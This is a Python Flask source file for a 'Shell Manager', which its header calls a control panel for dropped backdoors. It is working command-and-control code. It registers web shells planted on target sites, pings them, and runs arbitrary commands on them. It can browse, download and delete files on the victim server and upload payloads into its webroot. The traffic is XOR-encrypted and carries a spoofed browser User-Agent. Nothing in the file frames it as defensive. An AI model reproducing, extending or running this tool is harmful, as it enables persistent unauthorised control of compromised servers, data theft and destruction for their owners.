#!/usr/bin/env python3
"""
shell_manager.py — Web-based shell manager
Control panel for dropped backdoors.

Features:
  - register shells (URL + secret + label)
  - live status check (ping each shell)
  - browse remote directories through any registered shell
  - upload files into the target's webroot through any shell
  - delete files remotely
  - download files from any shell

Run:
    pip install flask requests
    python3 shell_manager.py --port 5000 --secret admin123
    open http://localhost:5000
"""

import os
import sys
import json
import time
import base64
import hashlib
import argparse
import threading
import sqlite3
from pathlib import Path
from datetime import datetime
from flask import Flask, request, jsonify, Response, render_template_string
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIG
# ============================================================

DEFAULT_PORT   = 5000
DEFAULT_SECRET = "admin123"
DB_PATH        = "shells.db"

# ============================================================
# CRYPTO — matches server.py on the target
# ============================================================

def derive_key(secret: str, length: int) -> bytes:
    seed = hashlib.sha256(secret.encode()).digest()
    out = b""
    while len(out) < length:
        seed = hashlib.sha256(seed).digest()
        out += seed
    return out[:length]

def xor_apply(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

def encrypt_payload(plain: bytes, secret: str) -> bytes:
    key = derive_key(secret, 32)
    return base64.b64encode(xor_apply(plain, key))

def decrypt_payload(b64: bytes, secret: str):
    try:
        ct = base64.b64decode(b64, validate=True)
    except Exception:
        return None
    key = derive_key(secret, 32)
    return xor_apply(ct, key)

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS shells (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            label TEXT NOT NULL,
            url TEXT NOT NULL UNIQUE,
            secret TEXT NOT NULL,
            host TEXT,
            cwd TEXT,
            info TEXT,
            online INTEGER DEFAULT 0,
            last_seen INTEGER,
            added INTEGER
        )
    """)
    conn.commit()
    conn.close()

def db_all():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM shells ORDER BY id DESC").fetchall()
    conn.close()
    return [dict(r) for r in rows]

def db_get(sid):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    row = conn.execute("SELECT * FROM shells WHERE id = ?", (sid,)).fetchone()
    conn.close()
    return dict(row) if row else None

def db_add(label, url, secret):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute(
            "INSERT INTO shells (label, url, secret, added) VALUES (?, ?, ?, ?)",
            (label, url, secret, int(time.time())),
        )
        conn.commit()
        sid = c.lastrowid
    except sqlite3.IntegrityError:
        sid = None
    conn.close()
    return sid

def db_update(sid, **fields):
    if not fields:
        return
    keys = ", ".join(f"{k} = ?" for k in fields)
    values = list(fields.values()) + [sid]
    conn = sqlite3.connect(DB_PATH)
    conn.execute(f"UPDATE shells SET {keys} WHERE id = ?", values)
    conn.commit()
    conn.close()

def db_delete(sid):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM shells WHERE id = ?", (sid,))
    conn.commit()
    conn.close()

# ============================================================
# CLIENT — talk to a remote shell
# ============================================================

def shell_call(url, secret, op, timeout=15, **args):
    payload = json.dumps({"op": op, "args": args}).encode()
    enc = encrypt_payload(payload, secret)
    headers = {
        "X-Token": secret,
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/octet-stream",
    }
    try:
        r = requests.post(url, data=enc, headers=headers, timeout=timeout, verify=False)
        if r.status_code != 200:
            return {"ok": False, "error": f"http {r.status_code}"}
        plain = decrypt_payload(r.content, secret)
        if plain is None:
            return {"ok": False, "error": "decrypt failed"}
        return json.loads(plain.decode())
    except requests.RequestException as e:
        return {"ok": False, "error": str(e)}

# ============================================================
# BACKGROUND — refresh shell status
# ============================================================

def refresh_all_shells():
    for s in db_all():
        r = shell_call(s["url"], s["secret"], "info", timeout=8)
        if r.get("ok"):
            db_update(
                s["id"],
                online=1,
                last_seen=int(time.time()),
                host=r.get("hostname", ""),
                cwd=r.get("cwd", ""),
                info=json.dumps(r),
            )
        else:
            db_update(s["id"], online=0)

def background_loop():
    while True:
        try:
            refresh_all_shells()
        except Exception:
            pass
        time.sleep(30)

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)
ADMIN_SECRET = DEFAULT_SECRET

def auth_ok():
    return request.cookies.get("auth") == ADMIN_SECRET

# ============================================================
# HTML/CSS/JS — embedded single page
# ============================================================

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shell Manager</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --bg: #0a0e14;
    --bg-soft: #11151d;
    --bg-card: #161b25;
    --border: #1f2635;
    --text: #c8d1e0;
    --muted: #6b7589;
    --accent: #00e0a4;
    --accent-dim: #008c68;
    --red: #ff4d6d;
    --amber: #ffb547;
    --blue: #4d9fff;
  }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, "SF Pro Display", "Segoe UI", system-ui, sans-serif;
    font-size: 14px;
    line-height: 1.5;
    min-height: 100vh;
  }
  a { color: var(--accent); text-decoration: none; }
  a:hover { text-decoration: underline; }

  .container { max-width: 1400px; margin: 0 auto; padding: 24px; }

  header {
    display: flex; align-items: center; justify-content: space-between;
    padding-bottom: 20px; margin-bottom: 24px;
    border-bottom: 1px solid var(--border);
  }
  header h1 {
    font-size: 20px; font-weight: 600; color: #fff;
    letter-spacing: -0.3px;
    display: flex; align-items: center; gap: 10px;
  }
  header h1::before {
    content: ""; display: inline-block; width: 10px; height: 10px;
    background: var(--accent); border-radius: 50%;
    box-shadow: 0 0 12px var(--accent);
    animation: pulse 2s ease-in-out infinite;
  }
  @keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:.5 } }

  .stat-bar {
    display: flex; gap: 20px; color: var(--muted); font-size: 12px;
    text-transform: uppercase; letter-spacing: 1px;
  }
  .stat-bar span b { color: var(--accent); font-weight: 600; }

  .grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
    gap: 16px;
  }

  .card {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 18px;
    transition: all .15s ease;
  }
  .card:hover { border-color: var(--accent-dim); }

  .card-head {
    display: flex; align-items: flex-start; justify-content: space-between;
    margin-bottom: 12px;
  }
  .card-title {
    font-size: 15px; font-weight: 600; color: #fff;
    display: flex; align-items: center; gap: 8px;
    word-break: break-all;
  }
  .status-dot {
    width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0;
    background: var(--muted);
  }
  .status-dot.online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
  .status-dot.offline { background: var(--red); }

  .card-meta {
    display: flex; flex-direction: column; gap: 6px;
    font-size: 12px; color: var(--muted);
    margin-bottom: 14px;
  }
  .card-meta .row { display: flex; gap: 8px; }
  .card-meta .row span:first-child {
    color: var(--muted); min-width: 60px; text-transform: uppercase;
    font-size: 10px; letter-spacing: 1px; padding-top: 2px;
  }
  .card-meta .row span:last-child {
    color: var(--text); word-break: break-all; font-family: ui-monospace, monospace;
    font-size: 12px;
  }

  .card-actions {
    display: flex; gap: 8px; flex-wrap: wrap;
    padding-top: 12px; border-top: 1px solid var(--border);
  }

  button, .btn {
    background: var(--bg-soft);
    color: var(--text);
    border: 1px solid var(--border);
    padding: 7px 14px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 12px;
    cursor: pointer;
    transition: all .12s ease;
    font-weight: 500;
  }
  button:hover, .btn:hover { border-color: var(--accent); color: var(--accent); }
  button.primary { background: var(--accent); color: #0a0e14; border-color: var(--accent); font-weight: 600; }
  button.primary:hover { background: #00ffb8; }
  button.danger:hover { border-color: var(--red); color: var(--red); }

  .panel {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 20px;
    margin-bottom: 24px;
  }
  .panel h2 {
    font-size: 14px; font-weight: 600; color: #fff;
    margin-bottom: 16px; text-transform: uppercase;
    letter-spacing: 1.5px; font-size: 11px;
  }

  .field-grid {
    display: grid; grid-template-columns: 1fr 2fr 1fr auto;
    gap: 10px; align-items: end;
  }
  @media (max-width: 720px) {
    .field-grid { grid-template-columns: 1fr; }
  }
  label {
    display: block; font-size: 10px;
    text-transform: uppercase; letter-spacing: 1.5px;
    color: var(--muted); margin-bottom: 5px;
  }
  input[type="text"], input[type="password"], input[type="file"], select, textarea {
    width: 100%;
    background: var(--bg-soft);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 9px 12px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 13px;
    outline: none;
    transition: border-color .12s;
  }
  input:focus, select:focus, textarea:focus { border-color: var(--accent); }
  input[type="file"] { padding: 7px 10px; font-size: 12px; }
  textarea { font-family: ui-monospace, monospace; resize: vertical; min-height: 120px; }

  /* modal */
  .modal-bg {
    position: fixed; inset: 0; background: rgba(0,0,0,.7);
    display: none; align-items: center; justify-content: center;
    z-index: 1000; backdrop-filter: blur(4px);
  }
  .modal-bg.active { display: flex; }
  .modal {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 12px;
    width: 90%; max-width: 900px; max-height: 85vh;
    display: flex; flex-direction: column;
    overflow: hidden;
  }
  .modal-head {
    padding: 16px 20px; border-bottom: 1px solid var(--border);
    display: flex; justify-content: space-between; align-items: center;
  }
  .modal-head h3 { font-size: 14px; color: #fff; font-weight: 600; }
  .modal-body { padding: 20px; overflow: auto; flex: 1; }
  .modal-foot { padding: 12px 20px; border-top: 1px solid var(--border); display: flex; gap: 8px; justify-content: flex-end; }

  .close-x {
    background: none; border: none; color: var(--muted);
    font-size: 22px; cursor: pointer; padding: 0 8px;
  }
  .close-x:hover { color: var(--red); }

  /* file browser */
  .fb-path {
    background: var(--bg-soft); border: 1px solid var(--border);
    padding: 10px 12px; border-radius: 6px; margin-bottom: 12px;
    font-family: ui-monospace, monospace; font-size: 12px;
    word-break: break-all; color: var(--accent);
  }
  .fb-list {
    background: var(--bg-soft); border: 1px solid var(--border);
    border-radius: 6px; max-height: 400px; overflow: auto;
  }
  .fb-item {
    display: grid; grid-template-columns: 24px 1fr 90px 60px 120px;
    gap: 10px; padding: 8px 12px; border-bottom: 1px solid var(--border);
    font-family: ui-monospace, monospace; font-size: 12px;
    align-items: center;
  }
  .fb-item:hover { background: var(--bg-card); }
  .fb-item.dir .fb-name { color: var(--accent); cursor: pointer; }
  .fb-item.file .fb-name { color: var(--text); }
  .fb-item .fb-name { word-break: break-all; }
  .fb-item .fb-size { color: var(--muted); font-size: 11px; text-align: right; }
  .fb-item .fb-perm { color: var(--muted); font-size: 11px; }
  .fb-item .fb-actions { display: flex; gap: 6px; justify-content: flex-end; }
  .fb-item .fb-actions button {
    padding: 3px 8px; font-size: 10px; border-radius: 4px;
  }

  .empty {
    padding: 40px; text-align: center; color: var(--muted);
    font-style: italic;
  }

  .toast {
    position: fixed; bottom: 20px; right: 20px;
    background: var(--bg-card); border: 1px solid var(--accent);
    color: var(--text); padding: 12px 18px;
    border-radius: 8px; font-size: 13px;
    opacity: 0; transform: translateY(10px);
    transition: all .2s ease; pointer-events: none;
    z-index: 2000; max-width: 400px;
  }
  .toast.show { opacity: 1; transform: translateY(0); }
  .toast.error { border-color: var(--red); }

  .upload-area {
    background: var(--bg-soft); border: 1px dashed var(--border);
    border-radius: 8px; padding: 20px; text-align: center;
    transition: all .15s;
  }
  .upload-area:hover { border-color: var(--accent); }
  .upload-area.dragover { border-color: var(--accent); background: rgba(0,224,164,.05); }

  .progress {
    width: 100%; height: 4px; background: var(--border);
    border-radius: 2px; overflow: hidden; margin-top: 12px; display: none;
  }
  .progress.active { display: block; }
  .progress-bar {
    height: 100%; background: var(--accent); width: 0%;
    transition: width .2s ease;
  }
</style>
</head>
<body>

<div class="container">
  <header>
    <h1>Shell Manager</h1>
    <div class="stat-bar">
      <span>shells: <b id="stat-total">0</b></span>
      <span>online: <b id="stat-online">0</b></span>
      <span>offline: <b id="stat-offline">0</b></span>
    </div>
  </header>

  <div class="panel">
    <h2>Register New Shell</h2>
    <form id="add-form" class="field-grid">
      <div>
        <label>Label</label>
        <input type="text" name="label" placeholder="e.g. client-site-1" required>
      </div>
      <div>
        <label>Shell URL</label>
        <input type="text" name="url" placeholder="http://target.com/bd.php" required>
      </div>
      <div>
        <label>Secret</label>
        <input type="text" name="secret" placeholder="shared secret" required>
      </div>
      <button type="submit" class="primary">Add</button>
    </form>
  </div>

  <div id="shells" class="grid">
    <div class="empty">loading shells...</div>
  </div>
</div>

<!-- File browser modal -->
<div class="modal-bg" id="fb-modal">
  <div class="modal">
    <div class="modal-head">
      <h3 id="fb-title">File Browser</h3>
      <button class="close-x" onclick="closeFB()">&times;</button>
    </div>
    <div class="modal-body">
      <div class="fb-path" id="fb-path">/</div>
      <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
        <button onclick="fbGo('..')">.. up</button>
        <button onclick="fbGo('/')">/ root</button>
        <button onclick="fbRefresh()">refresh</button>
      </div>
      <div class="fb-list" id="fb-list">loading...</div>
    </div>
    <div class="modal-foot">
      <button onclick="closeFB()">Close</button>
    </div>
  </div>
</div>

<!-- Upload modal -->
<div class="modal-bg" id="up-modal">
  <div class="modal" style="max-width: 560px;">
    <div class="modal-head">
      <h3 id="up-title">Upload File</h3>
      <button class="close-x" onclick="closeUP()">&times;</button>
    </div>
    <div class="modal-body">
      <label style="margin-bottom:8px; display:block;">Remote path (full file path on target)</label>
      <input type="text" id="up-path" placeholder="/var/www/html/payload.php" style="margin-bottom:16px;">
      <div class="upload-area" id="up-drop">
        <div style="color:var(--muted); margin-bottom:10px;">drag file here or click to select</div>
        <input type="file" id="up-file">
      </div>
      <div class="progress" id="up-progress"><div class="progress-bar" id="up-progress-bar"></div></div>
    </div>
    <div class="modal-foot">
      <button onclick="closeUP()">Cancel</button>
      <button class="primary" onclick="doUpload()">Upload</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let shells = [];
let fbShellId = null;
let upShellId = null;

// ---------- toast ----------
function toast(msg, isErr) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.className = 'toast show' + (isErr ? ' error' : '');
  setTimeout(() => { el.className = 'toast'; }, 3000);
}

// ---------- api ----------
async function api(path, opts) {
  const r = await fetch(path, opts);
  if (!r.ok) {
    const t = await r.text();
    throw new Error(t || r.statusText);
  }
  return await r.json();
}

// ---------- render ----------
function renderShells() {
  const box = document.getElementById('shells');
  if (!shells.length) {
    box.innerHTML = '<div class="empty">no shells registered yet. add one above.</div>';
    return;
  }
  let html = '';
  for (const s of shells) {
    const online = s.online ? 'online' : 'offline';
    let info = {};
    try { info = s.info ? JSON.parse(s.info) : {}; } catch(e) {}
    const host = s.host || info.hostname || '?';
    const cwd  = s.cwd  || info.cwd  || '?';
    const user = info.user || '?';
    const php  = info.php_version || info.python || '?';

    html += `
      <div class="card">
        <div class="card-head">
          <div class="card-title">
            <span class="status-dot ${online}"></span>
            ${escapeHtml(s.label)}
          </div>
        </div>
        <div class="card-meta">
          <div class="row"><span>url</span><span>${escapeHtml(s.url)}</span></div>
          <div class="row"><span>host</span><span>${escapeHtml(host)}</span></div>
          <div class="row"><span>cwd</span><span>${escapeHtml(cwd)}</span></div>
          <div class="row"><span>user</span><span>${escapeHtml(user)}</span></div>
          <div class="row"><span>ver</span><span>${escapeHtml(String(php)).slice(0,60)}</span></div>
          <div class="row"><span>seen</span><span>${s.last_seen ? new Date(s.last_seen*1000).toLocaleString() : 'never'}</span></div>
        </div>
        <div class="card-actions">
          <button onclick="openFB(${s.id})">Files</button>
          <button onclick="openUP(${s.id})">Upload</button>
          <button onclick="pingShell(${s.id})">Ping</button>
          <button onclick="execShell(${s.id})">Exec</button>
          <button class="danger" onclick="delShell(${s.id})">Remove</button>
        </div>
      </div>
    `;
  }
  box.innerHTML = html;
  updateStats();
}

function updateStats() {
  document.getElementById('stat-total').textContent = shells.length;
  document.getElementById('stat-online').textContent = shells.filter(s => s.online).length;
  document.getElementById('stat-offline').textContent = shells.filter(s => !s.online).length;
}

function escapeHtml(t) {
  const d = document.createElement('div');
  d.textContent = t == null ? '' : String(t);
  return d.innerHTML;
}

// ---------- load ----------
async function loadShells() {
  try {
    shells = await api('/api/shells');
    renderShells();
  } catch(e) {
    toast('load failed: ' + e.message, true);
  }
}

// ---------- add ----------
document.getElementById('add-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const f = e.target;
  const body = {
    label: f.label.value,
    url: f.url.value,
    secret: f.secret.value,
  };
  try {
    const r = await api('/api/shells', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(body),
    });
    if (r.ok) {
      toast('shell added');
      f.reset();
      loadShells();
    } else {
      toast(r.error || 'add failed', true);
    }
  } catch(e) {
    toast('add failed: ' + e.message, true);
  }
});

// ---------- delete ----------
async function delShell(id) {
  if (!confirm('remove this shell?')) return;
  await api('/api/shells/' + id, { method: 'DELETE' });
  toast('removed');
  loadShells();
}

// ---------- ping ----------
async function pingShell(id) {
  toast('pinging...');
  const r = await api('/api/shells/' + id + '/ping', { method: 'POST' });
  if (r.ok) {
    toast('online — ' + (r.latency_ms || '?') + 'ms');
    loadShells();
  } else {
    toast('offline: ' + (r.error || 'unknown'), true);
    loadShells();
  }
}

// ---------- exec ----------
async function execShell(id) {
  const cmd = prompt('command:');
  if (!cmd) return;
  const r = await api('/api/shells/' + id + '/exec', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({cmd}),
  });
  if (r.ok) {
    alert('output:\n\n' + (r.stdout || '') + (r.stderr ? '\n[stderr]\n' + r.stderr : ''));
  } else {
    alert('error: ' + (r.error || 'unknown'));
  }
}

// ---------- file browser ----------
async function openFB(id) {
  fbShellId = id;
  document.getElementById('fb-modal').classList.add('active');
  document.getElementById('fb-title').textContent = 'File Browser — shell #' + id;
  await fbGo('');
}

function closeFB() {
  document.getElementById('fb-modal').classList.remove('active');
  fbShellId = null;
}

async function fbGo(path) {
  const r = await api('/api/shells/' + fbShellId + '/ls', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({path}),
  });
  if (!r.ok) {
    document.getElementById('fb-list').innerHTML = '<div class="empty">error: ' + escapeHtml(r.error) + '</div>';
    return;
  }
  document.getElementById('fb-path').textContent = r.cwd;
  let html = '';
  if (r.entries && r.entries.length) {
    // prepend .. link if possible
    const parent = r.cwd.replace(/\/+$/, '').split('/').slice(0,-1).join('/') || '/';
    html += `<div class="fb-item dir" onclick="fbGo('${escapeAttr(parent)}')">
      <div>📁</div><div class="fb-name">..</div><div></div><div></div><div></div></div>`;
    for (const e of r.entries) {
      const icon = e.type === 'dir' ? '📁' : '📄';
      const click = e.type === 'dir' ? `onclick="fbGo('${escapeAttr(e.path)}')"` : '';
      html += `<div class="fb-item ${e.type}">
        <div>${icon}</div>
        <div class="fb-name" ${click}>${escapeHtml(e.name)}</div>
        <div class="fb-size">${e.type === 'dir' ? '-' : humanSize(e.size)}</div>
        <div class="fb-perm">${escapeHtml(e.perms)}</div>
        <div class="fb-actions">
          ${e.type === 'file' ? `<button onclick="fbDl('${escapeAttr(e.path)}')">dl</button>` : ''}
          <button class="danger" onclick="fbRm('${escapeAttr(e.path)}')">rm</button>
        </div>
      </div>`;
    }
  } else {
    html = '<div class="empty">empty directory</div>';
  }
  document.getElementById('fb-list').innerHTML = html;
}

function fbRefresh() {
  const p = document.getElementById('fb-path').textContent;
  fbGo(p);
}

async function fbRm(path) {
  if (!confirm('delete ' + path + '?')) return;
  const r = await api('/api/shells/' + fbShellId + '/rm', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({path}),
  });
  if (r.ok) {
    toast('deleted');
    fbRefresh();
  } else {
    toast('delete failed: ' + r.error, true);
  }
}

async function fbDl(path) {
  const r = await api('/api/shells/' + fbShellId + '/read', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({path}),
  });
  if (!r.ok) {
    toast('read failed: ' + r.error, true);
    return;
  }
  // decode and download
  const bin = atob(r.data_b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  const blob = new Blob([arr], {type:'application/octet-stream'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = path.split('/').pop() || 'download.bin';
  a.click();
  URL.revokeObjectURL(a.href);
}

function humanSize(n) {
  if (n == null) return '?';
  const u = ['B','KB','MB','GB'];
  let i = 0;
  while (n >= 1024 && i < u.length-1) { n /= 1024; i++; }
  return n.toFixed(1) + u[i];
}

function escapeAttr(t) {
  return String(t).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

// ---------- upload ----------
function openUP(id) {
  upShellId = id;
  document.getElementById('up-modal').classList.add('active');
  document.getElementById('up-title').textContent = 'Upload — shell #' + id;
  document.getElementById('up-path').value = '';
  document.getElementById('up-file').value = '';
}

function closeUP() {
  document.getElementById('up-modal').classList.remove('active');
  upShellId = null;
}

const dropEl = document.getElementById('up-drop');
const fileEl = document.getElementById('up-file');
dropEl.addEventListener('click', () => fileEl.click());
dropEl.addEventListener('dragover', (e) => { e.preventDefault(); dropEl.classList.add('dragover'); });
dropEl.addEventListener('dragleave', () => dropEl.classList.remove('dragover'));
dropEl.addEventListener('drop', (e) => {
  e.preventDefault();
  dropEl.classList.remove('dragover');
  if (e.dataTransfer.files.length) {
    fileEl.files = e.dataTransfer.files;
    suggestPath();
  }
});
fileEl.addEventListener('change', suggestPath);

function suggestPath() {
  const f = fileEl.files[0];
  if (!f) return;
  const p = document.getElementById('up-path');
  if (!p.value) {
    p.value = '/tmp/' + f.name;
  }
}

async function doUpload() {
  const f = fileEl.files[0];
  const remote = document.getElementById('up-path').value.trim();
  if (!f) { toast('pick a file first', true); return; }
  if (!remote) { toast('enter remote path', true); return; }

  const prog = document.getElementById('up-progress');
  const bar = document.getElementById('up-progress-bar');
  prog.classList.add('active');
  bar.style.width = '0%';

  const buf = await f.arrayBuffer();
  const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
  bar.style.width = '50%';

  const r = await api('/api/shells/' + upShellId + '/upload', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({path: remote, data_b64: b64}),
  });

  bar.style.width = '100%';
  setTimeout(() => {
    prog.classList.remove('active');
    bar.style.width = '0%';
  }, 500);

  if (r.ok) {
    toast('uploaded ' + r.bytes + ' bytes → ' + r.path);
    closeUP();
  } else {
    toast('upload failed: ' + r.error, true);
  }
}

// ---------- init ----------
loadShells();
setInterval(loadShells, 30000);
</script>
</body>
</html>
"""

# ============================================================
# LOGIN PAGE
# ============================================================

LOGIN_PAGE = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login — Shell Manager</title>
<style>
body { background:#0a0e14; color:#c8d1e0; font-family:system-ui,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
.box { background:#161b25; border:1px solid #1f2635; border-radius:12px; padding:36px; width:340px; }
h2 { color:#fff; margin:0 0 24px; font-size:18px; text-align:center; }
input { width:100%; background:#11151d; border:1px solid #1f2635; color:#c8d1e0; padding:11px 14px; border-radius:6px; margin-bottom:14px; font-size:14px; box-sizing:border-box; outline:none; }
input:focus { border-color:#00e0a4; }
button { width:100%; background:#00e0a4; color:#0a0e14; border:none; padding:11px; border-radius:6px; font-weight:600; cursor:pointer; font-size:14px; }
button:hover { background:#00ffb8; }
.err { color:#ff4d6d; text-align:center; margin-bottom:12px; font-size:13px; }
</style>
</head>
<body>
<div class="box">
  <h2>Shell Manager</h2>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="password" name="secret" placeholder="admin secret" autofocus>
    <button type="submit">Enter</button>
  </form>
</div>
</body>
</html>
"""

# ============================================================
# ROUTES
# ============================================================

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("secret") == ADMIN_SECRET:
            resp = Response("", status=302)
            resp.headers["Location"] = "/"
            resp.set_cookie("auth", ADMIN_SECRET, httponly=True, samesite="Lax")
            return resp
        error = "wrong secret"
    return render_template_string(LOGIN_PAGE, error=error)

@app.route("/logout")
def logout():
    resp = Response("", status=302)
    resp.headers["Location"] = "/login"
    resp.delete_cookie("auth")
    return resp

@app.route("/")
def index():
    if not auth_ok():
        return Response("", status=302, headers={"Location": "/login"})
    return HTML_PAGE

# ---------- api ----------

@app.route("/api/shells", methods=["GET"])
def api_list():
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    return jsonify(db_all())

@app.route("/api/shells", methods=["POST"])
def api_add():
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    d = request.get_json() or {}
    label = (d.get("label") or "").strip()
    url   = (d.get("url") or "").strip()
    secret= (d.get("secret") or "").strip()
    if not (label and url and secret):
        return jsonify({"ok": False, "error": "missing fields"})
    sid = db_add(label, url, secret)
    if sid is None:
        return jsonify({"ok": False, "error": "duplicate url"})
    # immediate check
    r = shell_call(url, secret, "info", timeout=8)
    if r.get("ok"):
        db_update(sid,
            online=1,
            last_seen=int(time.time()),
            host=r.get("hostname",""),
            cwd=r.get("cwd",""),
            info=json.dumps(r),
        )
    return jsonify({"ok": True, "id": sid})

@app.route("/api/shells/<int:sid>", methods=["DELETE"])
def api_del(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    db_delete(sid)
    return jsonify({"ok": True})

@app.route("/api/shells/<int:sid>/ping", methods=["POST"])
def api_ping(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    t0 = time.time()
    r = shell_call(s["url"], s["secret"], "ping", timeout=8)
    dt = int((time.time() - t0) * 1000)
    if r.get("ok"):
        db_update(sid, online=1, last_seen=int(time.time()))
        return jsonify({"ok": True, "latency_ms": dt})
    db_update(sid, online=0)
    return jsonify({"ok": False, "error": r.get("error", "fail")})

@app.route("/api/shells/<int:sid>/exec", methods=["POST"])
def api_exec(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    d = request.get_json() or {}
    cmd = d.get("cmd", "")
    if not cmd: return jsonify({"ok": False, "error": "no cmd"})
    r = shell_call(s["url"], s["secret"], "exec", cmd=cmd, timeout=60)
    return jsonify(r)

@app.route("/api/shells/<int:sid>/ls", methods=["POST"])
def api_ls(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    d = request.get_json() or {}
    path = d.get("path") or s.get("cwd") or ""
    r = shell_call(s["url"], s["secret"], "ls", path=path, timeout=20)
    return jsonify(r)

@app.route("/api/shells/<int:sid>/read", methods=["POST"])
def api_read(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    d = request.get_json() or {}
    path = d.get("path")
    if not path: return jsonify({"ok": False, "error": "no path"})
    r = shell_call(s["url"], s["secret"], "read", path=path, timeout=60)
    return jsonify(r)

@app.route("/api/shells/<int:sid>/upload", methods=["POST"])
def api_upload(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    d = request.get_json() or {}
    path = d.get("path")
    data_b64 = d.get("data_b64")
    if not path or not data_b64:
        return jsonify({"ok": False, "error": "missing path or data"})
    r = shell_call(s["url"], s["secret"], "upload", path=path, data_b64=data_b64, timeout=120)
    return jsonify(r)

@app.route("/api/shells/<int:sid>/rm", methods=["POST"])
def api_rm(sid):
    if not auth_ok(): return jsonify({"error":"unauthorized"}), 401
    s = db_get(sid)
    if not s: return jsonify({"ok": False, "error": "not found"})
    d = request.get_json() or {}
    path = d.get("path")
    if not path: return jsonify({"ok": False, "error": "no path"})
    r = shell_call(s["url"], s["secret"], "delete", path=path, timeout=20)
    return jsonify(r)

# ============================================================
# MAIN
# ============================================================

def main():
    global ADMIN_SECRET

    ap = argparse.ArgumentParser(description="shell manager")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--secret", default=DEFAULT_SECRET, help="admin login secret")
    ap.add_argument("--no-bg", action="store_true", help="disable background refresh loop")
    args = ap.parse_args()

    ADMIN_SECRET = args.secret

    init_db()

    if not args.no_bg:
        t = threading.Thread(target=background_loop, daemon=True)
        t.start()

    print(f"[*] shell manager on http://{args.host}:{args.port}")
    print(f"[*] admin secret: {args.secret}")
    print(f"[*] db: {DB_PATH}")

    app.run(host=args.host, port=args.port, debug=False, threaded=True)

if __name__ == "__main__":
    main()
